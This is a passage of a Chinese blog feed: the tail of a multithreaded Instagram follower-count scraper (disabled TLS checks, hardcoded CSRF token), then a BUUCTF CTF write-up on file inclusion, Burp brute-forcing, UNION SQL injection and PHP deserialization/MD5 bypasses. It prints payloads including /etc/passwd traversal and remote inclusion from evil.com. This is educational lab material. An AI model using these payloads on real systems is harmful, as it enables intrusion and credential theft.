requests.packages.urllib3.util.retry <span class="hljs-keyword">import</span> Retry<br><br><span class="hljs-comment"># 避免输出不必要的HTTPS安全警告信息</span><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><br><span class="hljs-comment"># 用户名处理函数:去掉`@`符号</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sanitize_username</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">if</span> username.startswith(<span class="hljs-string">&#x27;@&#x27;</span>):<br>        <span class="hljs-keyword">return</span> username.lstrip(<span class="hljs-string">&#x27;@&#x27;</span>)  <br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;@&#x27;</span> <span class="hljs-keyword">in</span> username:<br>        <span class="hljs-keyword">return</span> username.split(<span class="hljs-string">&#x27;@&#x27;</span>)[<span class="hljs-number">0</span>]  <br>    <span class="hljs-keyword">return</span> username<br><br><br><span class="hljs-comment"># 创建带重试机制的请求会话</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_session_with_retries</span>():<br>    session = requests.Session()<br>    retries = Retry(total=<span class="hljs-number">5</span>, backoff_factor=<span class="hljs-number">1</span>, status_forcelist=[<span class="hljs-number">429</span>, <span class="hljs-number">500</span>, <span class="hljs-number">502</span>, <span class="hljs-number">503</span>, <span class="hljs-number">504</span>])<br>    session.mount(<span class="hljs-string">&#x27;http://&#x27;</span>, HTTPAdapter(max_retries=retries))<br>    session.mount(<span class="hljs-string">&#x27;https://&#x27;</span>, HTTPAdapter(max_retries=retries))<br>    <span class="hljs-keyword">return</span> session<br><br><br><span class="hljs-comment"># 获取Instagram粉丝数量</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_instagram_follower_count</span>(<span class="hljs-params">username, proxies</span>):<br>    sanitized_username = sanitize_username(username)<br>    url = <span class="hljs-string">&quot;https://www.instagram.com/api/v1/users/web_profile_info/&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: sanitized_username<br>    &#125;<br>    <br>    headers = &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;www.instagram.com&quot;</span>,<br>        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>,<br>        <span class="hljs-string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="hljs-string">&quot;?0&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;sec-ch-ua-platform-version&quot;</span>: <span class="hljs-string">&quot;\&quot;12.2.1\&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;X-ASBD-ID&quot;</span>: <span class="hljs-string">&quot;129477&quot;</span>,<br>        <span class="hljs-string">&quot;X-CSRFToken&quot;</span>: <span class="hljs-string">&quot;aMFPLyFGuRw9PXGLAg8CXx&quot;</span>,<br>        <span class="hljs-string">&quot;X-IG-App-ID&quot;</span>: <span class="hljs-string">&quot;936619743392459&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">f&quot;https://www.instagram.com/<span class="hljs-subst">&#123;sanitized_username&#125;</span>/&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><br>    &#125;<br>    <br>    session = create_session_with_retries()<br>    <br>    time.sleep(<span class="hljs-number">1</span>)  <br>    <br>    <span class="hljs-keyword">try</span>:<br>    <br>        response = session.get(url, headers=headers, params=params, proxies=proxies, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">try</span>:<br>            <br>                data = response.json()<br>                <br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> data <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;data&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;data&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;edge_followed_by&#x27;</span> <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>]:<br>                    <br>                        follower_count = data[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>][<span class="hljs-string">&#x27;edge_followed_by&#x27;</span>][<span class="hljs-string">&#x27;count&#x27;</span>]<br>                        <br>                        <span class="hljs-keyword">return</span> follower_count<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <br><br><br><span class="hljs-comment"># 线程工作函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue, output_file, proxies, lock</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <br>        username = queue.get()<br>        <br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">try</span>:<br>        <br>            result = get_instagram_follower_count(username, proxies)<br>            <br>            <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <br>                <span class="hljs-keyword">with</span> lock:<br>                <br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, mode=<span class="hljs-string">&#x27;a&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> outfile:<br>                    <br>                        writer = csv.writer(outfile)<br>                        writer.writerow([username, result])<br>                        <br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">pass</span>  <br>        queue.task_done()<br><br><br><span class="hljs-comment"># 读取用户名并创建线程处理</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_usernames</span>(<span class="hljs-params">input_csv, output_csv, num_threads=<span class="hljs-number">4</span>, queue_size=<span class="hljs-number">10000</span></span>):<br>    queue = Queue(maxsize=queue_size)<br>    lock = threading.Lock()<br>    proxies = &#123;<br>        <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;   &#x27;</span>,<br>        <span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;  &#x27;</span><br>    &#125;<br>    <br>    <span class="hljs-comment"># Write the header to the output CSV file</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_csv, mode=<span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> outfile:<br>        writer = csv.writer(outfile)<br>        writer.writerow([<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;follower_counts&#x27;</span>]) <br>  <br>    <span class="hljs-comment"># Start threads</span><br>    threads = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_threads):<br>        thread = threading.Thread(target=worker, args=(queue, output_csv, proxies, lock))<br>        thread.start()<br>        threads.append(thread)<br>        <br>    <span class="hljs-comment"># Read usernames from the input CSV file and process them</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_csv, mode=<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> infile:<br>        reader = csv.reader(infile)<br>        <span class="hljs-built_in">next</span>(reader)  <span class="hljs-comment"># Skip the header row</span><br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            username = row[<span class="hljs-number">0</span>]<br>            queue.put(username)<br><br>    <span class="hljs-comment"># Stop workers</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_threads):<br>        queue.put(<span class="hljs-literal">None</span>)  <span class="hljs-comment"># Add a None for each worker to signal them to exit</span><br><br>    <span class="hljs-comment"># Wait for all threads to finish</span><br>    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>        thread.join()<br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Results have been written to <span class="hljs-subst">&#123;output_csv&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    input_csv = <span class="hljs-string">&#x27;instagram.csv&#x27;</span><br>    output_csv = <span class="hljs-string">&#x27;output.csv&#x27;</span><br>    process_usernames(input_csv, output_csv)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作流程&quot;&gt;&lt;a href=&quot;#操作流程&quot; class=&quot;headerlink&quot; title=&quot;操作流程&quot;&gt;&lt;/a&gt;操作流程&lt;/h1&gt;&lt;h3 id=&quot;1-分析网页URL&quot;&gt;&lt;a href=&quot;#1-分析网页URL&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="记一次实践" scheme="http://example.com/tags/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF Basic 解题记录</title>
    <link href="http://example.com/2024/08/31/BUUCTF%20Basic%20%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2024/08/31/BUUCTF%20Basic%20%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-08-31T04:01:51.000Z</published>
    <updated>2024-12-09T08:32:51.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;    <br>    <span class="hljs-variable">$str </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有include，判断是文件包含漏洞</p><h2 id="文件包含漏洞产生原因"><a href="#文件包含漏洞产生原因" class="headerlink" title="文件包含漏洞产生原因"></a>文件包含漏洞产生原因</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。利用该漏洞，攻击者可能读取服务器上的敏感文件，执行恶意代码，甚至完全控制服务器。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>对上面这段 PHP 代码进行分析，把一个 GET 请求的参数 file 传给了一个变量str，然后包含了这个变量。但是开发者没有对 <code>$_GET[&#39;file&#39;]</code> 参数经过严格的过滤，直接带入了 include 的函数，这就造成了文件包含漏洞，如此一来，攻击者便可以修改$_GET[‘file’]的值，包含网站的敏感文件进行查看。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>在 url 后加上 <code>/?file=/flag</code>。<code>../</code> 查找上一级目录，<code>/</code> 查找根目录。<br><img src="/../images/Pasted%20image%2020240831210231.png"></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="1-文件包含函数"><a href="#1-文件包含函数" class="headerlink" title="1. 文件包含函数"></a>1. 文件包含函数</h3><p>在 PHP 中共有四种文件包含函数：</p><ul><li><strong>Include（）</strong>：包含并运行指定的文件，只有在程序执行到 include 时才包含文件，且当包含文件发生错误时，程序警告，但会继续执行。</li><li><strong>Require（）</strong>：只要程序一运行就会执行该包含文件函数，当包含文件发生错误时，程序直接终止执行。</li><li><strong>Include_once（）</strong>：和 include（）类似，不同之处在于 include_once 会检查这个文件是否已经被导入，如果已导入、下文便不会再导入。</li><li><strong>Require_once（）</strong>：和 require（）类似，不同处在于 require_once 也是只导入一次。</li></ul><h3 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a>2. 漏洞分类</h3><p>文件包含漏洞共分为两大类，本地文件包含和远程文件包含。</p><h4 id="1-本地文件包含（LFI）"><a href="#1-本地文件包含（LFI）" class="headerlink" title="(1) 本地文件包含（LFI）"></a>(1) 本地文件包含（LFI）</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>如果攻击者将<code>file</code>参数设置为<code>/etc/passwd</code>，例如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/vulnerable.php?file=/</span>etc/passwd<br></code></pre></td></tr></table></figure><p>服务器可能会将<code>/etc/passwd</code>文件的内容显示在网页上。<br>攻击者还可以通过目录遍历技巧访问超出预期目录范围的文件。例如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/vulnerable.php?file=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h4 id="2-远程文件包含（RFI）"><a href="#2-远程文件包含（RFI）" class="headerlink" title="(2) 远程文件包含（RFI）"></a>(2) 远程文件包含（RFI）</h4><p>RFI漏洞的利用通常依赖于PHP配置中<code>allow_url_include</code>选项被启用。<br>攻击者可以将<code>file</code>参数设置为远程URL，例如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/vulnerable.php?file=http:/</span><span class="hljs-regexp">/evil.com/m</span>alicious.php<br></code></pre></td></tr></table></figure><p>此时，服务器可能会包含并执行<code>malicious.php</code>文件中的恶意代码。</p><h3 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3. 防护措施"></a>3. 防护措施</h3><h4 id="（1）使用白名单限制文件包含"><a href="#（1）使用白名单限制文件包含" class="headerlink" title="（1）使用白名单限制文件包含"></a>（1）使用白名单限制文件包含</h4><p>只允许包含预定义的文件，限制用户输入的范围。</p><h4 id="（2）验证和过滤用户输入"><a href="#（2）验证和过滤用户输入" class="headerlink" title="（2）验证和过滤用户输入"></a>（2）验证和过滤用户输入</h4><ul><li>使用<code>basename()</code>函数提取文件名，防止路径遍历攻击。</li><li>移除不必要的路径分隔符或特殊字符。</li></ul><h4 id="（3）禁用远程文件包含"><a href="#（3）禁用远程文件包含" class="headerlink" title="（3）禁用远程文件包含"></a>（3）禁用远程文件包含</h4><p>在<code>php.ini</code>文件中禁用<code>allow_url_include</code>和<code>allow_url_fopen</code></p><h4 id="（4）使用绝对路径"><a href="#（4）使用绝对路径" class="headerlink" title="（4）使用绝对路径"></a>（4）使用绝对路径</h4><p>采用绝对路径而非相对路径来包含文件，避免被用户输入影响。</p><h4 id="（5）最小化权限"><a href="#（5）最小化权限" class="headerlink" title="（5）最小化权限"></a>（5）最小化权限</h4><p>服务器上的文件权限应设置为最小化，仅允许Web服务器访问必要的文件。</p><h4 id="（6）日志记录和监控"><a href="#（6）日志记录和监控" class="headerlink" title="（6）日志记录和监控"></a>（6）日志记录和监控</h4><p> 实现日志记录机制，记录异常的文件包含请求，并设置监控系统检测异常行为。</p><h1 id="BUU-BRUTE-1"><a href="#BUU-BRUTE-1" class="headerlink" title="BUU BRUTE 1"></a>BUU BRUTE 1</h1><h2 id="1-随便输入，用burpsuite抓包"><a href="#1-随便输入，用burpsuite抓包" class="headerlink" title="1. 随便输入，用burpsuite抓包"></a>1. 随便输入，用burpsuite抓包</h2><p><img src="/../images/Pastedimage20240827114016.png"><br><img src="/../images/Pasted%20image%2020240827114433.png"></p><h2 id="2-发送到Repeater"><a href="#2-发送到Repeater" class="headerlink" title="2. 发送到Repeater"></a>2. 发送到Repeater</h2><p>点击发送，在响应结构中点击响应内容，显示用户名错误。<br><img src="/../images/Pasted%20image%2020240827114947.png"><br>在 Repeater 中，可以手动编辑 HTTP 请求的各个部分，包括方法、URL、参数、请求头、Cookies、请求体等。根据服务器的响应内容，测试人员可以确定所修改的请求是否引发了漏洞，或是否达到了预期的测试目的。</p><p> 单独抓包时回显仅用户名错误，考虑先爆破用户名。</p><h2 id="3-爆破用户名"><a href="#3-爆破用户名" class="headerlink" title="3. 爆破用户名"></a>3. 爆破用户名</h2><p>在代理中右键将其发送到Intruder。对<code>username</code>添加<code>payload位置</code><br>payload：有效载荷，指的是在网络数据包或恶意软件中传递的实际数据内容。<br><img src="/../images/Pasted%20image%2020240827132109.png"><br>在payload板块添加字典，开始攻击。<br><img src="/../images/Pasted%20image%2020240827134045.png"><br>通过长度判断正确值和错误值。点击长度，自动排序。与大量数据不同的值所对应的payload大概率就是正确的payload。<br><img src="/../images/Pasted%20image%2020240828102450.png"><br>点击admin，发现render显示的是密码错误，说明用户名爆破成功。<br><img src="/../images/Pasted%20image%2020240828103014.png"></p><h2 id="4-爆破密码"><a href="#4-爆破密码" class="headerlink" title="4. 爆破密码"></a>4. 爆破密码</h2><p>用户名改为admin。<br><img src="/../images/Pasted%20image%2020240828110444.png"><br>选中密码，发送到intruder。已经得知密码是一个四位数字，所以将payload类型设置成数值类型。<br><img src="/../images/Pasted%20image%2020240828111816.png"><br>密码是6490。<br><img src="/../images/Pasted%20image%2020240828140344.png"><br>登录成功。<br><img src="/../images/Pasted%20image%2020240828140452.png"></p><h1 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h1><p><img src="/../images/Pasted%20image%2020240828144108.png"><br>F12打开开发工具，查看网络<br><img src="/../images/Pasted%20image%2020240828152548.png"><br>访问backend&#x2F;content_detail.php?id&#x3D;1，修改id有不同的返回信息<br>输入1 and 1&#x3D;2，没有任何回显<br>order by判断列数。1,2有回显，3没有回显，说明有2列。<br>?id&#x3D;-1 union select 1,2 判断显位点<br><img src="/../images/Pasted%20image%2020240828153610.png"><br>爆破数据库：?id&#x3D;-1 union select 1,database()<br><img src="/../images/Pasted%20image%2020240828153807.png"><br>得到数据库库名<code>news</code>，获取数据表信息：?id&#x3D;-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’news’)<br><img src="/../images/Pasted%20image%2020240828154506.png"><br>得到表名信息<code>admin</code>,<code>contents</code>,使用<code>admin</code>表，获取字段名信息：?id&#x3D;-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’news’ and table_name&#x3D;’admin’)<br><img src="/../images/Pasted%20image%2020240828155159.png"><br>得到字段名分别是<code>id</code>,<code>username</code>,<code>password</code>,获取<code>username</code>：?id&#x3D;-1 union select 1,(select group_concat(username) from admin)<br><img src="/../images/Pasted%20image%2020240828155344.png"><br>获取<code>password</code>：?id&#x3D;-1 union select 1,(select group_concat(password) from admin)<br><img src="/../images/Pasted%20image%2020240828155451.png"><br>登录成功。<br><img src="/../images/Pasted%20image%2020240828155543.png"></p><h1 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p><strong>序列化</strong>将数据转化成一种可逆的数据结构（如JSON、XML、二进制格式等），逆向的过程就叫做<strong>反序列化</strong>。<br>php中<strong>serialize()</strong> 和<strong>unserialize()</strong> 函数分别对目标进行序列化和反序列化。<br>举例如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;shui&#x27;</span>,<span class="hljs-string">&#x27;mi&#x27;</span>,<span class="hljs-string">&#x27;tao&#x27;</span>);<br><span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$user</span>.PHP_EOL);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user</span>));<br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;shui&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;mi&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;tao&quot;</span>;&#125; <br><span class="hljs-built_in">Array</span> <br>( <br>[<span class="hljs-number">0</span>] =&gt; shui <br>[<span class="hljs-number">1</span>] =&gt; mi <br>[<span class="hljs-number">2</span>] =&gt; tao <br>)<br></code></pre></td></tr></table></figure><p><code>serialize()</code> 函数将数组转换为一个字符串，以便能够存储或传递。<br><code>unserialize()</code> 函数将序列化的字符串重新转换为原来的数组格式。<br>a: array, 代表是数组，后面的3说明有三个属性。<br>i: 代表是整型数据int，后面的0是数组下标。<br>s: 代表是字符串，后面的4是因为shui长度为4。<br>依次类推。</p><p><strong>序列化场景</strong>：</p><ul><li>数据持久化：将对象或数据结构保存到文件或数据库中，以便以后可以重新加载。例如，将Python对象序列化为JSON格式并存储在文件中。</li><li>网络传输：在分布式系统中，数据需要在不同的服务或系统之间传输。为了在网络中传输复杂数据结构，需要将它们序列化为可传输的格式（如JSON、XML、Protobuf）。</li><li>缓存：在Web应用中，复杂对象通常会被序列化后存储在缓存（如Redis、Memcached）中，以提高应用的性能。当需要时，再反序列化读取。</li><li>进程间通信（IPC）：在一些需要进程间通信的场景中，数据需要序列化后在进程间传递。例如，使用消息队列（如RabbitMQ、Kafka）时，消息需要序列化为字节格式进行传递。</li></ul><p><strong>反序列化漏洞</strong>：通常发生在对用户提供的数据进行反序列化时。如果用户能够控制传入的序列化数据，而应用在反序列化时没有进行适当的安全检查，那么攻击者可以构造恶意的序列化数据，触发特定的魔术方法（如 <code>__wakeup()</code>、<code>__destruct()</code>），执行任意代码，造成安全风险。</p><p><strong>魔术方法</strong>：在PHP中，魔术方法是一类以两个下划线（<code>__</code>）开头的特殊方法。在某些条件下自动执行会导致反序列化漏洞。</p><ul><li><code>__construct()</code>：对象创建时自动调用的构造函数。</li><li><code>__destruct()</code>：对象销毁时自动调用的析构函数。</li><li><code>__call()</code>：调用未定义或不可访问的方法时自动调用。</li><li><code>__callStatic()</code>：调用未定义或不可访问的静态方法时自动调用。</li><li><code>__get()</code>：访问未定义或不可访问的属性时自动调用。</li><li><code>__set()</code>：为未定义或不可访问的属性赋值时自动调用。</li><li><code>__isset()</code>：调用 <code>isset()</code> 或 <code>empty()</code> 时自动调用。</li><li><code>__unset()</code>：调用 <code>unset()</code> 时自动调用。</li><li><code>__sleep()</code>：序列化对象时自动调用。</li><li><code>__wakeup()</code>：反序列化对象时自动调用。</li><li><code>__toString()</code>：尝试将对象转换为字符串时自动调用。</li><li><code>__invoke()</code>：尝试将对象当作函数调用时自动调用。</li><li><code>__clone()</code>：克隆对象时自动调用。</li></ul><h3 id="MD5哈希碰撞"><a href="#MD5哈希碰撞" class="headerlink" title="MD5哈希碰撞"></a>MD5哈希碰撞</h3><ul><li>MD5 是一种不安全的哈希算法，已知它是可以被攻击的，尤其是找到两个不同输入，使得它们的 MD5 哈希值相等（称为哈希碰撞）。</li><li>攻击者可以通过精心构造两个不同的字符串 <code>md51</code> 和 <code>md52</code>，使得它们的 <code>md5</code> 哈希值相等，这样就可以绕过这个检查。</li><li>常见的绕过弱md5的方法有两种：<br>  1.科学计数法绕过，PHP 当中使用<code>==</code> 来进行比较的时候，系统会自动处理数据类型， 进行分析是数字比较还是字符比较。 而当一个字符串值是0e开头的时候，就会被当作数值，php会认为它是科学计数法，而 0的多少次方都是 0。<br>  常见的绕过值有：QNKCDZO、s155964671a、s1091221200a<br>  2.数组绕过，原理是 md5 等函数不能处理数组，导致函数返回null。而null是等于null的，导致了绕过。</li></ul><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;  <br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct </span>= <span class="hljs-string">&quot;&quot;</span>;  <br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input </span>= <span class="hljs-string">&quot;&quot;</span>;  <br>  <br>   <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function __destruct</span>() &#123;  <br>       <span class="hljs-keyword">try</span> &#123;           <br>       <span class="hljs-variable language_">$this</span>-&gt;correct = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">uniqid</span>());  <br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;correct === <span class="hljs-variable language_">$this</span>-&gt;input) &#123;  <br>               <span class="hljs-keyword">echo</span><span class="hljs-title function_ invoke__"> file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);  <br>           &#125;  <br>       &#125; <span class="hljs-keyword">catch</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;  <br>       &#125;  <br>   &#125;  <br>&#125;  <br>  <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) <br>        &#123;            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-类定义"><a href="#1-类定义" class="headerlink" title="1. 类定义"></a>1. 类定义</h3><ul><li>定义了一个类 <code>BUU</code>，包含两个公共属性 <code>correct</code> 和 <code>input</code>，以及一个析构函数 <code>__destruct()</code>。</li><li>在 <code>__destruct()</code> 方法中，<code>$this-&gt;correct</code> 被设置为一个随机生成的唯一标识符的Base64编码，然后与 <code>$this-&gt;input</code> 进行严格比较（<code>===</code>）。如果相等，则会读取并显示 <code>/flag</code> 文件的内容。</li></ul><h3 id="2-条件判断"><a href="#2-条件判断" class="headerlink" 